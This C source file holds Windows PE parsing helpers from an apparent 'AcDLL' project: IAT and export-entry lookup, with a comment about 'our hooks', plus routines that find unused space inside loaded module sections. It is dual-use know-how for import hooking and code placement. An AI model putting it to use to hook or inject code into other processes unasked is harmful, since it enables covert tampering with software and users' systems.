//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// AcDLL project. Version 1.9.17.3
//	
// module: pesup.c
// $Revision: 147 $
// $Date: 2014-01-29 14:10:21 +0400 (Ср, 29 янв 2014) $
// description: 
//	PE file header support functions and types.

#include "Common.h"


static PIAT_ENTRY ImportScanLoop(
					PCHAR	ModuleBase, 
					ULONG	SizeOfImage,
					PCHAR	ImportedFunction, 
					USHORT	ImportedOrdinal,
					ULONG   rvaINT,
					ULONG   rvaIAT
					)
{
	PIAT_ENTRY	pIatEntry = NULL;
	PIMAGE_IMPORT_BY_NAME   pOrdinalName;
	PIMAGE_THUNK_DATA		pINT;
	PIMAGE_THUNK_DATA		pIAT;

	ASSERT(ImportedFunction||ImportedOrdinal);

	if ( rvaINT == 0 )   // No Characteristics field?
	{	
		// Yes! Gotta have a non-zero FirstThunk field then.
		rvaINT = rvaIAT;
	     
		if ( rvaINT == 0 )   // No FirstThunk field?  Ooops!!!
			return(NULL);
	}
        
	// Adjust the pointer to point where the tables are in the
	// mem mapped file.
	pINT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaINT, ModuleBase);
	if (!pINT )
		return(NULL);
		
	pIAT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaIAT, ModuleBase);

	while (TRUE) // Loop forever (or until we break out)
	{
		if ( pINT->u1.AddressOfData == 0 )
			break;

		if ( ImportedFunction )
		{
			if ( IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal) == FALSE)
			{
				pOrdinalName = (PIMAGE_IMPORT_BY_NAME)PeSupRvaToVa((ULONG)pINT->u1.AddressOfData, ModuleBase);
				if(_stricmp( (PCHAR)&pOrdinalName->Name, ImportedFunction ) == 0) 
				{	
					pIatEntry = &pIAT->u1.Function;
					break;  // We did it, get out
				}
			}
			else if( pINT->u1.Ordinal >= (ULONG_PTR)ModuleBase &&
		 		 pINT->u1.Ordinal < ((ULONG_PTR)ModuleBase + SizeOfImage))
			{
				pOrdinalName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pINT->u1.AddressOfData);
				if ( pOrdinalName ) 
				{
					if(_stricmp( (PCHAR)&pOrdinalName->Name, ImportedFunction) == 0) 
					{	
						pIatEntry = &pIAT->u1.Function;
						break;  // We did it, get out
					}
				}
			}
		}
		else{
			if ( IMAGE_ORDINAL(pINT->u1.Ordinal) == ImportedOrdinal ) 
			{	
				pIatEntry = &pIAT->u1.Function;
				break;  // We did it, get out
			}
		}

		pINT++;         // advance to next thunk
		pIAT++;         // advance to next thunk
	} // while (TRUE)	

	return(pIatEntry);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for IAT entry of a specified function within a specified module. Returns pointer to the IAT entry 
//	 or NULL if no such function found within module import.
//
PIAT_ENTRY PeSupGetIatEntry (
	HMODULE				TargetModule,		// ImageBase of the target module (where Iat entry should be found)
	PCHAR				ImportedModule,		// name of imported module
	PCHAR				ImportedFunction,	// name of imported function
	USHORT				ImportedOrdinal,	// ordinal of imported function
	PTR_IS_IAT_ENTRY	pIsIatEntry			// (OPTIONAL) pointer to a function that matches an IAT entry with the function name
	)
{
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
	ULONG                    importsStartRVA;
	PCHAR                    ModuleName;
	PIAT_ENTRY               pIatEntry = NULL;
	PCHAR					 ModuleBase = (PCHAR)TargetModule;

	PIMAGE_NT_HEADERS	PEHeader = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	ASSERT(ImportedFunction || ImportedOrdinal);

	// Get the import table RVA from the data dir
	importsStartRVA = 
		PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if ( !importsStartRVA )
		return NULL;

	pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)PeSupRvaToVa(importsStartRVA, ModuleBase);

	if ( !pImportDesc )
		return NULL;

	// Find the import descriptor containing references to callee's functions
	for (; pImportDesc->Name; pImportDesc++) 
	{
		
		if(ModuleName = (PCHAR)PeSupRvaToVa(pImportDesc->Name, ModuleBase))
		{
			if ((ImportedModule == NULL) || (_stricmp(ModuleName, ImportedModule) == 0))
			{
			   // Target imported module found

				if (pImportDesc->OriginalFirstThunk != 0)
				{
					pIatEntry = 
						ImportScanLoop(
							ModuleBase, 
							PEHeader->OptionalHeader.SizeOfImage, 
							ImportedFunction, 
							ImportedOrdinal,
							pImportDesc->OriginalFirstThunk, 
							pImportDesc->FirstThunk
							);
				}
				else
				{
					// There's the IAT allocated over the Ordinal table. This means the Ordinal table is already trashed by
					//  the IAT. We cannot just upload it from the source file because the source file can be packed.
					// So we have to scan the IAT and search for the corresponding values within our hooks. 
					if (pIsIatEntry)
					{
						PIAT_ENTRY pNewEntry = (PIAT_ENTRY)PeSupRvaToVa(pImportDesc->FirstThunk, ModuleBase);

						while(*pNewEntry)
						{
							if ((pIsIatEntry)((PVOID)*pNewEntry, ImportedFunction,ImportedOrdinal))
							{
								pIatEntry = pNewEntry;
								break;
							}
							pNewEntry += 1;
						}	// while(*pNewEntry)
					}	//	if (pIsIatEntry)
				}	// else	// if (pImportDesc->OriginalFirstThunk != 0)

				if (pIatEntry)
					break;
			} // if ((ImportedModule == NULL) ||
		} // if(ModuleName = (PCHAR)PeSupRvaToVa
	} // for (; pImportDesc->Name; pImportDesc++) 
	return(pIatEntry);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for delay IAT entry of a specified function within a specified module. Returns pointer to the IAT entry 
//	 or NULL if no such function found within module import.
//
PIAT_ENTRY PeSupGetDelayIatEntry (
		HMODULE           TargetModule,			// ImageBase of the target module (where Iat entry should be found)
		PCHAR             ImportedModule,		// name of imported module
		PCHAR             ImportedFunction,		// name of imported function
		USHORT            ImportedOrdinal	// ordinal of imported function
		)
{
	PIMAGE_DELAY_IMPORT_DESCRIPTOR pImportDesc;
	ULONG                    importsStartRVA;
	PCHAR                    ModuleName;
	PIAT_ENTRY               pIatEntry = NULL;
	PCHAR					 ModuleBase = (PCHAR)TargetModule;

	PIMAGE_NT_HEADERS	PEHeader = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get the import table RVA from the data dir
	importsStartRVA = 
		PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;

	if ( !importsStartRVA )
		return NULL;

	pImportDesc = (PIMAGE_DELAY_IMPORT_DESCRIPTOR)PeSupRvaToVa(importsStartRVA, ModuleBase);

	if ( !pImportDesc )
		return NULL;

	// Find the import descriptor containing references to callee's functions
	for (; pImportDesc->Name; pImportDesc++) 
	{
		if(ModuleName = (PCHAR)PeSupRvaToVa(pImportDesc->Name, ModuleBase))
		{
			if ((ImportedModule == NULL) || (_stricmp(ModuleName, ImportedModule) == 0))
			{
				pIatEntry = 
					ImportScanLoop(
						ModuleBase, 
						PEHeader->OptionalHeader.SizeOfImage, 
						ImportedFunction,
						ImportedOrdinal,
						pImportDesc->OriginalFirstThunk, 
						pImportDesc->FirstThunk
						);

				if ((pIatEntry) || (ImportedModule != NULL))
					break;
			} // if ((ImportedModule == NULL) ||
		} // if(ModuleName = (PCHAR)PeSupRvaToVa
	} // for (; pImportDesc->Name; pImportDesc++) 
	return(pIatEntry);
}


PIMAGE_EXPORT_DIRECTORY PeSupGetImageExportDirectory(PCHAR ModuleBase)
{
	PIMAGE_NT_HEADERS32		PEHeader32	= (PIMAGE_NT_HEADERS32)PeSupGetImagePeHeader(ModuleBase);
	PIMAGE_NT_HEADERS64		PEHeader64	= (PIMAGE_NT_HEADERS64)PEHeader32;
	PIMAGE_EXPORT_DIRECTORY	ExportDirectory;

	if (PEHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + PEHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	else
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + PEHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

	return(ExportDirectory);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for Export table entry of a specified function within a specified module. 
//   Returns pointer to the found entry 
//	 or NULL if no such function found within module export.
//
PEXPORT_ENTRY	PeSupGetExportEntry( 
					HMODULE  TargetModule,		// Image base of the target module (where exported function located)
					PCHAR    ExportedFunction	// exported function name
		)
{
	PIMAGE_EXPORT_DIRECTORY pExpDir			= NULL;
	PULONG   ppFunctions					= NULL;
	PULONG   ppNames						= NULL;
	PUSHORT  pOrdinals						= NULL;
	ULONG	 NumberOfNames					= 0;
	ULONG	 OldPointer						= 0;
	ULONG	 i;

	NTSTATUS ntStatus = STATUS_SUCCESS;
	PCHAR	 ModuleBase = (PCHAR)TargetModule;
	
	PEXPORT_ENTRY	FoundEntry				= NULL;
	PIMAGE_NT_HEADERS PEHeader	= (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get export directory
	pExpDir = PeSupGetImageExportDirectory(ModuleBase);

	if (pExpDir == NULL || pExpDir->AddressOfFunctions == 0 || pExpDir->AddressOfNames == 0 )
		return NULL;


	// Get names, functions and ordinals arrays pointers
	ppFunctions = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfFunctions );
	ppNames = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfNames );
	pOrdinals = (PUSHORT) (ModuleBase + (ULONG)pExpDir ->AddressOfNameOrdinals );

	NumberOfNames = pExpDir->NumberOfNames;

	// Walk the export table entries
	for ( i = 0; i < NumberOfNames; ++i )
	{
		// Check if function name matches current entry
		if   (!lstrcmpA(ModuleBase + *ppNames, ExportedFunction))
		{
			FoundEntry = (PEXPORT_ENTRY)&ppFunctions [*pOrdinals];
			break;
		}
		ppNames++;
		pOrdinals++;
	}

	return(FoundEntry);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for Export table entry of a specified function within a specified module. 
//   Returns pointer to the found entry 
//	 or NULL if no such function found within module export.
//
PEXPORT_ENTRY	PeSupGetExportEntryByOrdinal( 
					HMODULE  TargetModule,		// Image base of the target module (where exported function located)
					USHORT   Ordinal	// exported function number
		)
{
	PIMAGE_EXPORT_DIRECTORY pExpDir			= NULL;
	PULONG   ppFunctions					= NULL;
	PULONG   ppNames						= NULL;
	PUSHORT  pOrdinals						= NULL;
	ULONG	 NumberOfFunctions				= 0;
	ULONG	 OldPointer						= 0;

	NTSTATUS ntStatus = STATUS_SUCCESS;
	PCHAR	 ModuleBase = (PCHAR)TargetModule;

	PEXPORT_ENTRY	FoundEntry				= NULL;
	PIMAGE_NT_HEADERS PEHeader	= (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get export directory
	pExpDir = PeSupGetImageExportDirectory(ModuleBase);

	if (pExpDir == NULL || pExpDir->AddressOfFunctions == 0 || pExpDir->AddressOfNames == 0 )
		return NULL;


	// Get names, functions and ordinals arrays pointers
	ppFunctions = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfFunctions );
	ppNames = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfNames );
	pOrdinals = (PUSHORT) (ModuleBase + (ULONG)pExpDir ->AddressOfNameOrdinals );

	NumberOfFunctions = pExpDir->NumberOfFunctions;

	// Now we can turn our attention to the nBase member of the IMAGE_EXPORT_DIRECTORY structure. 
	// You already know that the AddressOfFunctions array contains the addresses of all export 
	// symbols in a module. And the PE loader uses the indexes into this array to find the addresses 
	// of the functions. Let's imagine the scenario where we use the indexes into this array as the ordinals. 
	// Since the programmers can specify the starting ordinal number in .def file, like 200, 
	// it means that there must be at least 200 elements in the AddressOfFunctions array. 
	// Furthermore the first 200 elements are not used but they must exist so that the PE loader 
	// can use the indexes to find the correct addresses. This is not good at all. 
	// The nBase member exists to solve this problem. If the programmer specifies the starting ordinal of 200, 
	// the value in nBase would be 200. When the PE loader reads the value in nBase, 
	// it knows that the first 200 elements do not exist and that it should subtract the ordinal by the value in 
	// nBase to obtain the true index into the AddressOfFunctions array. With the use of nBase, 
	// there is no need to provide 200 empty elements.
	if ( Ordinal < pExpDir->Base ){
		return NULL;
	}
	Ordinal = Ordinal - (USHORT)pExpDir->Base;

	if ( Ordinal >= NumberOfFunctions ){
		return NULL;
	}
	return((PEXPORT_ENTRY)&ppFunctions [Ordinal]);
}

//
//	Returns list of buffers specifying free space within PE sections with the specified SectionFlags.
//
PLINKED_BUFFER PeSupGetSectionFreeBuffers(
	IN	HMODULE	TargetModule,	// module to scan sections within
	IN	ULONG	SectionFlags	// section flags
	)
{
	PLINKED_BUFFER FirstBuf = NULL;
	PLINKED_BUFFER LastBuf = NULL;
	PLINKED_BUFFER NewBuf = NULL;
	PCHAR DosHeader = (PCHAR)TargetModule;
	PIMAGE_NT_HEADERS Pe = (PIMAGE_NT_HEADERS)(DosHeader + ((PIMAGE_DOS_HEADER)DosHeader)->e_lfanew);
	PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(Pe);
	ULONG NumberOfSections = Pe->FileHeader.NumberOfSections;

	do 
	{
		if (Section->Characteristics & SectionFlags)
		{
			ULONG	RealSize = _ALIGN(Section->SizeOfRawData, Pe->OptionalHeader.FileAlignment);
			ULONG	VirtualSize = max(_ALIGN(Section->Misc.VirtualSize, PAGE_SIZE), _ALIGN(RealSize, PAGE_SIZE));
			ULONG	BufferSize;

			if (Section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)			
				RealSize = 0;
			
			BufferSize = VirtualSize - RealSize;

			if ((BufferSize) && (NewBuf = (PLINKED_BUFFER)AppAlloc(sizeof(LINKED_BUFFER))))
			{
				NewBuf->Next = NULL;
				NewBuf->Buffer = DosHeader + Section->VirtualAddress + RealSize;
				NewBuf->Size = BufferSize;
				if (FirstBuf == NULL)
					FirstBuf = NewBuf;
				else
					LastBuf->Next = NewBuf;
				LastBuf = NewBuf;
			}
		}	// if (Section->Characteristics & SectionFlags)
		Section += 1;
		NumberOfSections -= 1;
	} while (NumberOfSections);
	return(FirstBuf);
}

//
//	Returns file offset of the specified RVA within the specified PE module.
//
ULONG PeSupRvaToFileOffset(
	HMODULE	hModule,
	ULONG	Rva
	)
{
	PIMAGE_NT_HEADERS Pe = (PIMAGE_NT_HEADERS)((PCHAR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(Pe);
	USHORT	NumberOfSections = Pe->FileHeader.NumberOfSections;
	ULONG	Offset = 0;

	do
	{
		ULONG	RealSize = _ALIGN(pSection->SizeOfRawData, Pe->OptionalHeader.FileAlignment);
		ULONG	VirtualAddress = pSection->VirtualAddress;

		if (Rva >= VirtualAddress && Rva < (VirtualAddress + RealSize))
		{
			Offset = Rva - VirtualAddress + pSection->PointerToRawData;
			break;
		}
		pSection += 1;
	} while(NumberOfSections -= 1);

	return(Offset);
}


//
//	Searches for the PE section with the specified name within the specified target image
//
PVOID PeSupFindSectionByName(
	PCHAR			DosHeader,	// target image base
	PSECTION_NAME	SecName		// name of the section to look for
	)
{
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)(DosHeader + ((PIMAGE_DOS_HEADER)DosHeader)->e_lfanew);
	ULONG NumberOfSections = pe->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pe);
	PVOID pFound = NULL;

	do
	{
		PSECTION_NAME pName = (PSECTION_NAME)&pSection->Name;
		if (pName->Dword[0] == SecName->Dword[0] && pName->Dword[1] == SecName->Dword[1])
			pFound = (PVOID)pSection;

		pSection += 1;
		NumberOfSections -=1;
	} while((NumberOfSections) && (pFound == NULL));
	
	return(pFound);
}
